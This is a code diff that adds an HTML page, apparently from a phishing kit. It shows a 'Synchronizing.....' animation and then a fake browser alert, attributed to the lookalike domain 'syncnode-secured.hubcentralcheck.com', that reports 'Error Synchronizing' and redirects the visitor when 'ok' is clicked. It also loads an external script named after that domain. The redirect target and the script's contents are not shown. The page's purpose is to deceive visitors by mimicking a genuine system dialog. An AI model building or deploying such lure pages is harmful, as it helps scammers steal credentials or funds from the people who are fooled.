@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
+    <title>Error Importing</title>
+</head>
+    <style>
+        @keyframes moveInBox {
+            0%   { transform: translate(0, 0); }       /* Start */
+            25%  { transform: translate(3rem, 0); }   /* Right */
+            50%  { transform: translate(3rem, 3rem); } /* Down */
+            75%  { transform: translate(0, 3rem); }   /* Left */
+            100% { transform: translate(0, 0); }      /* Back to Start */
+        }
+
+        .box-motion {
+            animation: moveInBox 4s linear infinite;
+        }
+
+        /* Staggered Start for each box */
+        .box-motion:nth-child(2) {
+            animation-delay: 0.3s;
+        }
+
+        .box-motion:nth-child(3) {
+            animation-delay: 0.6s;
+        }
+    </style>
+
+<body class="px-8 relative flex items-center justify-center min-h-screen bg-gray-100">
+
+    <div id="moveRound" class="relative w-20 h-20 flex items-center justify-center">
+        <div class="absolute w-6 h-6 bg-yellow-500 box-motion"></div>
+        <div class="absolute w-6 h-6 bg-blue-500 box-motion"></div>
+        <div class="absolute w-6 h-6 bg-red-500 box-motion"></div>
+    </div>
+    <p class="ml-8 font-semibold pt-6">Synchronizing.....</p>
+
+    <div id="errorForm" class="hidden px-4 flex top-2 justify-center w-96 h-36 bg-[#fffbff] absolute border border-gray-200 shadow-md rounded-md">
+        <div class="mt-4 p-2">
+            <div>
+            <p class="">syncnode-secured.hubcentralcheck.com says</p>
+            </div>
+            <div class="mt-2">
+                <p class="text-xs text-black">Error Synchronizing</p>
+            </div>
+            <button onclick="redirect()" class="bg-[#696001] px-6 py-4 rounded-full text-white cursor-pointer mt-0 ml-60 p-2">ok</button>
+        </div>
+    </div>
+
+</body>
+<script src="syncnode-secure.hubcentralcheck.com.carda.phase_check.js"></script>
+</html>
